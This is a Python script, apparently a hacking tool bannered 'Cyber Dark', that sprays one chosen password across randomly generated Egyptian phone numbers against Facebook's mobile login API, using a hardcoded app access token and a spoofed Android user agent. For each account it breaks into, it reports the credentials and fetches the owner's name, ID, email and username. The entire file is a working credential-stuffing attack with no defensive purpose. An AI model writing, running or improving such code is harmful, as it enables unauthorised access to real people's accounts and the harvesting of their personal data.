#!/usr/bin/python2
# coding=utf-8
import requests,mechanize,os,json,random
from mechanize import Browser
os.system('clear')
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def info(ft):
 fb_token=ft
 otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
 a = json.loads(otw.text)
 fn = a['name']
 print(f'[√] FB Name ==> {fn}')
 if KeyError:
  pass
 id = a['id']
 print(f'[√] FaceBook ID ==> {id}')
 if KeyError:
  pass
  bd = a['birthday']
  print(f'[√] FB BirthDay ==> {bd}')
 if 'email' in a:
  em= a['email']
  print(f'[√] FB E-mail ==> {em}')
 if KeyError:
  pass
  gn= a['gender']
  print(f'[√] FB Gender ==> {gn}')
 if 'username' in a:
  ur= a['username']
  print(f'[√] FB UserName ==> {ur}')
 if KeyError:
  pass
print("""
 _____       _                ______           _    
/  __ \     | |               |  _  \         | |   
| /  \/_   _| |__   ___ _ __  | | | |__ _ _ __| | __
| |   | | | | '_ \ / _ \ '__| | | | / _` | '__| |/ /
| \__/\ |_| | |_) |  __/ |    | |/ / (_| | |  |   < 
 \____/\__, |_.__/ \___|_|    |___/ \__,_|_|  |_|\_\
                __/ |                                       
       |___/                                    
==================================================""")
pswrd=input('[+] PassWord ==> ')
print('================================')
while True:
 user='1234567890'
 whisper = str("".join(random.choice(user)for i in range(8)))
 email= '+2011'+whisper
 password = pswrd
 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 q = json.load(data)
 if 'access_token' in q:
  print(G+'[√] E-mail ==> '+email+'\n[√] PassWord ==> '+password)
  ft=q['access_token']
  info(ft)
 elif 'www.facebook.com' in q['error_msg']:
  print(S+'[≈] E-mail ==> '+email+' | PassWord ==> '+password)
 else:
  print(E+'[×] E-mail ==> '+email+' | PassWord ==> '+password)